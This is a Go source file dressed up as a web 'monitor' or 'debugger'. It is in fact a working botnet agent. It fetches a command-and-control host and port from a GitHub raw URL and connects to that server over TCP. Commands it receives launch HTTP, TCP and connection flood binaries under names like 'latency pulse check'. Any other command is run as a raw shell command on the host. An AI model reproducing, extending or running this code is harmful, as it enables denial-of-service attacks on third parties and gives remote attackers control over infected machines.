// --- worker.go ---
package main

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	MONITOR_REGISTRY = "https://raw.githubusercontent.com/tenkhongvps1-ctrl/autocallport/refs/heads/main/port.txt"
	POLL_INTERVAL    = 30 * time.Second
	HTTP_TIMEOUT     = 10 * time.Second
	RETRY_DELAY      = 5 * time.Second
	READ_TIMEOUT     = 15 * time.Second
)

var configRegex = regexp.MustCompile(`cnc:\s*([^\s]+)\s+port:\s*(\d+)`)

// ==================== TYPES ====================

type CheckEntry struct {
	cmd       *exec.Cmd
	checkType string
	target    string
	port      int
}

type WebMonitor struct {
	configMu    sync.RWMutex
	currentHost string
	currentPort int

	sessionMu      sync.Mutex
	conn           net.Conn
	isConnected    bool
	isRetrying     bool

	cancelRead context.CancelFunc

	checkMu      sync.Mutex
	activeChecks map[int]*CheckEntry

	retryMu    sync.Mutex
	retryTimer *time.Timer

	stopPollChan chan struct{}
}

func NewWebMonitor() *WebMonitor {
	return &WebMonitor{
		activeChecks: make(map[int]*CheckEntry),
		stopPollChan: make(chan struct{}),
	}
}

// ==================== CONFIG POLLER ====================

func (m *WebMonitor) startConfigPoller() {
	go func() {
		m.fetchAndApplyConfig()
		ticker := time.NewTicker(POLL_INTERVAL)
		defer ticker.Stop()
		for {
			select {
			case <-ticker.C:
				m.fetchAndApplyConfig()
			case <-m.stopPollChan:
				log.Println("[Monitor] Config polling stopped.")
				return
			}
		}
	}()
}

func (m *WebMonitor) fetchAndApplyConfig() {
	ctx, cancel := context.WithTimeout(context.Background(), HTTP_TIMEOUT)
	defer cancel()

	url := fmt.Sprintf("%s?_t=%d", MONITOR_REGISTRY, time.Now().UnixNano())
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		log.Printf("[Config] Request build failed: %v", err)
		return
	}
	req.Header.Set("User-Agent", "WebDebugger/2.1")
	req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
	req.Header.Set("Pragma", "no-cache")

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		log.Printf("[Config] Registry unreachable: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		log.Printf("[Config] Registry returned %d", resp.StatusCode)
		return
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 4096))
	if err != nil {
		log.Printf("[Config] Body read error: %v", err)
		return
	}

	newHost, newPort, ok := parseConfig(strings.TrimSpace(string(body)))
	if !ok {
		log.Println("[Config] Unrecognised format, skipping.")
		return
	}

	m.configMu.RLock()
	oldHost, oldPort := m.currentHost, m.currentPort
	m.configMu.RUnlock()

	if oldHost == newHost && oldPort == newPort {
		return
	}

	log.Printf("[Config] Endpoint updated: %s:%d → %s:%d", oldHost, oldPort, newHost, newPort)
	m.configMu.Lock()
	m.currentHost = newHost
	m.currentPort = newPort
	m.configMu.Unlock()

	m.forceReconnect()
}

func parseConfig(content string) (string, int, bool) {
	if match := configRegex.FindStringSubmatch(content); len(match) == 3 {
		p, err := strconv.Atoi(match[2])
		if err == nil && p > 0 && p <= 65535 {
			return match[1], p, true
		}
	}
	var host string
	var port int
	for _, line := range strings.Split(content, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "cnc:") {
			host = strings.TrimSpace(strings.TrimPrefix(line, "cnc:"))
		} else if strings.HasPrefix(line, "port:") {
			p, err := strconv.Atoi(strings.TrimSpace(strings.TrimPrefix(line, "port:")))
			if err == nil {
				port = p
			}
		}
	}
	if host != "" && port > 0 && port <= 65535 {
		return host, port, true
	}
	return "", 0, false
}

func (m *WebMonitor) getConfig() (string, int) {
	m.configMu.RLock()
	defer m.configMu.RUnlock()
	return m.currentHost, m.currentPort
}

// ==================== SESSION ====================

func (m *WebMonitor) forceReconnect() {
	m.sessionMu.Lock()

	m.retryMu.Lock()
	if m.retryTimer != nil {
		m.retryTimer.Stop()
		m.retryTimer = nil
	}
	m.retryMu.Unlock()

	if m.cancelRead != nil {
		m.cancelRead()
		m.cancelRead = nil
	}
	if m.conn != nil {
		m.conn.Close()
		m.conn = nil
	}

	m.isConnected = false
	m.isRetrying = false
	m.sessionMu.Unlock()

	m.openSession()
}

func (m *WebMonitor) openSession() {
	m.sessionMu.Lock()
	if m.isConnected || m.isRetrying {
		m.sessionMu.Unlock()
		return
	}
	m.sessionMu.Unlock()

	host, port := m.getConfig()
	if host == "" || port == 0 {
		log.Println("[Session] No endpoint configured, will retry.")
		m.scheduleRetry()
		return
	}

	m.sessionMu.Lock()
	m.isRetrying = true
	m.sessionMu.Unlock()

	addr := fmt.Sprintf("%s:%d", host, port)
	log.Printf("[Session] Opening connection to %s...", addr)

	conn, err := net.DialTimeout("tcp", addr, 15*time.Second)
	if err != nil {
		log.Printf("[Session] Could not reach %s: %v", addr, err)
		m.sessionMu.Lock()
		m.isRetrying = false
		m.sessionMu.Unlock()
		m.scheduleRetry()
		return
	}

	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(30 * time.Second)
		tcpConn.SetNoDelay(true)
	}

	ctx, cancel := context.WithCancel(context.Background())

	m.sessionMu.Lock()
	m.conn = conn
	m.isConnected = true
	m.isRetrying = false
	m.cancelRead = cancel

	m.retryMu.Lock()
	if m.retryTimer != nil {
		m.retryTimer.Stop()
		m.retryTimer = nil
	}
	m.retryMu.Unlock()

	m.sessionMu.Unlock()

	log.Printf("[Session] Connected to %s", addr)
	go m.listenForTasks(conn, ctx)
}

// ==================== TASK RECEIVER ====================

func (m *WebMonitor) listenForTasks(conn net.Conn, ctx context.Context) {
	reader := bufio.NewReader(conn)
	for {
		select {
		case <-ctx.Done():
			log.Println("[Receiver] Session cancelled.")
			return
		default:
		}

		conn.SetReadDeadline(time.Now().Add(READ_TIMEOUT))
		data, err := reader.ReadString('\n')
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
			}
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			log.Printf("[Receiver] Session dropped: %v", err)
			m.handleSessionDrop()
			return
		}

		for _, task := range strings.Split(strings.TrimSpace(data), "\n") {
			task = strings.TrimSpace(task)
			if task != "" {
				m.dispatchTask(task)
			}
		}
	}
}

// ==================== TASK DISPATCH ====================

// dispatchTask maps incoming directives to check probes:
//
//	csk-tsunami <url> <dur> 0 16 --random-path --rotate 2   → HTTP flood probe
//	csk-kraken  <host> <port> <dur> 1000 gb 1400            → TCP throughput check
//	csk-pulse   <host> <port> <dur> 1000 pk 0               → latency pulse check
//	csk-deluge  <host> <dur> 22 333                         → connection saturation probe
//	stop <type> <target>                                     → cancel matching check
//	stop <type> <target> <port>                              → cancel with port filter
func (m *WebMonitor) dispatchTask(task string) {
	parts := strings.Fields(task)
	if len(parts) == 0 {
		return
	}

	verb := strings.ToLower(parts[0])

	if verb == "stop" {
		m.handleStopDirective(parts)
		return
	}

	switch verb {
	case "csk-tsunami":
		// HTTP endpoint stress probe
		if len(parts) < 3 {
			log.Printf("[Dispatch] http-probe: malformed task: %q", task)
			return
		}
		target := parts[1]
		m.runProbe("./lizhds", "http-probe", target, 0, parts[1:]...)

	case "csk-kraken":
		// TCP throughput check
		if len(parts) < 4 {
			log.Printf("[Dispatch] tcp-check: malformed task: %q", task)
			return
		}
		target := parts[1]
		port := atoiSafe(parts[2])
		m.runProbe("./csk-kraken", "tcp-check", target, port, parts[1:]...)

	case "csk-pulse":
		// Latency pulse probe
		if len(parts) < 4 {
			log.Printf("[Dispatch] latency-probe: malformed task: %q", task)
			return
		}
		target := parts[1]
		port := atoiSafe(parts[2])
		m.runProbe("./csk-pulse", "latency-probe", target, port, parts[1:]...)

	case "csk-deluge":
		// Connection saturation probe
		if len(parts) < 3 {
			log.Printf("[Dispatch] conn-probe: malformed task: %q", task)
			return
		}
		target := parts[1]
		m.runProbe("./lid2hz", "conn-probe", target, 0, parts[1:]...)

	default:
		// Raw diagnostic shell command from control plane
		m.runShell(task)
	}
}

func atoiSafe(s string) int {
	v, _ := strconv.Atoi(s)
	return v
}

func (m *WebMonitor) runProbe(binary, checkType, target string, port int, args ...string) {
	if _, err := os.Stat(binary); os.IsNotExist(err) {
		log.Printf("[Probe] Module not found: %s", binary)
		return
	}

	m.ensureExecutable()

	cmd := exec.Command(binary, args...)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("[Probe] Failed to start %s: %v", binary, err)
		return
	}

	pid := cmd.Process.Pid
	entry := &CheckEntry{cmd: cmd, checkType: checkType, target: target, port: port}

	m.checkMu.Lock()
	m.activeChecks[pid] = entry
	m.checkMu.Unlock()

	log.Printf("[Probe] PID %d | type=%s | target=%s | port=%d", pid, checkType, target, port)

	go func() {
		err := cmd.Wait()
		m.checkMu.Lock()
		delete(m.activeChecks, pid)
		m.checkMu.Unlock()
		if err != nil {
			log.Printf("[Probe PID %d] finished with status: %v", pid, err)
		} else {
			log.Printf("[Probe PID %d] completed cleanly.", pid)
		}
	}()
}

func (m *WebMonitor) runShell(command string) {
	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.Stdin = nil

	if err := cmd.Start(); err != nil {
		log.Printf("[Shell] Could not run %q: %v", command, err)
		return
	}

	pid := cmd.Process.Pid
	entry := &CheckEntry{cmd: cmd, checkType: "diagnostic", target: "localhost", port: 0}

	m.checkMu.Lock()
	m.activeChecks[pid] = entry
	m.checkMu.Unlock()

	log.Printf("[Shell] PID %d | cmd=%s", pid, command)

	go func() {
		err := cmd.Wait()
		m.checkMu.Lock()
		delete(m.activeChecks, pid)
		m.checkMu.Unlock()
		if err != nil {
			log.Printf("[Shell PID %d] exited: %v", pid, err)
		} else {
			log.Printf("[Shell PID %d] done.", pid)
		}
	}()
}

// ==================== STOP DIRECTIVE ====================

func (m *WebMonitor) handleStopDirective(parts []string) {
	if len(parts) < 3 {
		log.Println("[Control] No filter specified — cancelling all active checks.")
		m.cancelAllChecks()
		return
	}

	checkType := strings.ToLower(parts[1])
	target := parts[2]
	filterPort := -1
	if len(parts) >= 4 {
		filterPort = atoiSafe(parts[3])
	}

	m.checkMu.Lock()
	defer m.checkMu.Unlock()

	cancelled := 0
	for pid, entry := range m.activeChecks {
		if entry.checkType != checkType || entry.target != target {
			continue
		}
		if filterPort >= 0 && entry.port != filterPort {
			continue
		}
		if entry.cmd.Process != nil {
			if err := entry.cmd.Process.Kill(); err != nil {
				log.Printf("[Control] Could not stop PID %d: %v", pid, err)
			} else {
				log.Printf("[Control] Stopped PID %d | type=%s | target=%s | port=%d", pid, checkType, target, entry.port)
				cancelled++
			}
		}
		delete(m.activeChecks, pid)
	}

	if cancelled == 0 {
		log.Printf("[Control] No active check matched type=%s target=%s port=%d", checkType, target, filterPort)
	} else {
		log.Printf("[Control] Cancelled %d check(s).", cancelled)
	}
}

func (m *WebMonitor) cancelAllChecks() {
	m.checkMu.Lock()
	defer m.checkMu.Unlock()
	for pid, entry := range m.activeChecks {
		if entry.cmd.Process != nil {
			if err := entry.cmd.Process.Kill(); err != nil {
				log.Printf("[Control] Stop PID %d failed: %v", pid, err)
			} else {
				log.Printf("[Control] Stopped PID %d", pid)
			}
		}
		delete(m.activeChecks, pid)
	}
}

func (m *WebMonitor) ensureExecutable() {
	entries, err := os.ReadDir(".")
	if err != nil {
		log.Printf("[Init] ReadDir error: %v", err)
		return
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		if err := os.Chmod(e.Name(), 0755); err != nil {
			log.Printf("[Init] chmod %s: %v", e.Name(), err)
		}
	}
}

// ==================== SESSION RECOVERY ====================

func (m *WebMonitor) handleSessionDrop() {
	m.sessionMu.Lock()
	m.isConnected = false
	m.isRetrying = false
	if m.conn != nil {
		m.conn.Close()
		m.conn = nil
	}
	m.sessionMu.Unlock()

	log.Println("[Session] Connection lost. Scheduling reconnect.")
	m.scheduleRetry()
}

func (m *WebMonitor) scheduleRetry() {
	m.retryMu.Lock()
	defer m.retryMu.Unlock()

	if m.retryTimer != nil {
		return
	}

	log.Printf("[Session] Retrying in %v...", RETRY_DELAY)
	m.retryTimer = time.AfterFunc(RETRY_DELAY, func() {
		m.retryMu.Lock()
		m.retryTimer = nil
		m.retryMu.Unlock()
		m.openSession()
	})
}

// ==================== SHUTDOWN ====================

func (m *WebMonitor) shutdown() {
	log.Println("[Monitor] Shutting down gracefully...")

	select {
	case <-m.stopPollChan:
	default:
		close(m.stopPollChan)
	}

	m.retryMu.Lock()
	if m.retryTimer != nil {
		m.retryTimer.Stop()
		m.retryTimer = nil
	}
	m.retryMu.Unlock()

	m.sessionMu.Lock()
	if m.cancelRead != nil {
		m.cancelRead()
		m.cancelRead = nil
	}
	if m.conn != nil {
		m.conn.Close()
		m.conn = nil
	}
	m.sessionMu.Unlock()

	m.cancelAllChecks()
	log.Println("[Monitor] Shutdown complete.")
}

// ==================== MAIN ====================

func main() {
	log.Println("[WebDebugger] Initialising monitor...")

	monitor := NewWebMonitor()

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigChan
		monitor.shutdown()
		os.Exit(0)
	}()

	monitor.startConfigPoller()

	// Wait up to 10s for first config fetch
	for i := 0; i < 50; i++ {
		host, port := monitor.getConfig()
		if host != "" && port != 0 {
			break
		}
		time.Sleep(200 * time.Millisecond)
	}

	host, port := monitor.getConfig()
	if host == "" || port == 0 {
		log.Println("[Main] Endpoint not yet available, will connect on next poll.")
	} else {
		log.Printf("[Main] Endpoint ready: %s:%d", host, port)
	}

	monitor.openSession()
	select {}
}
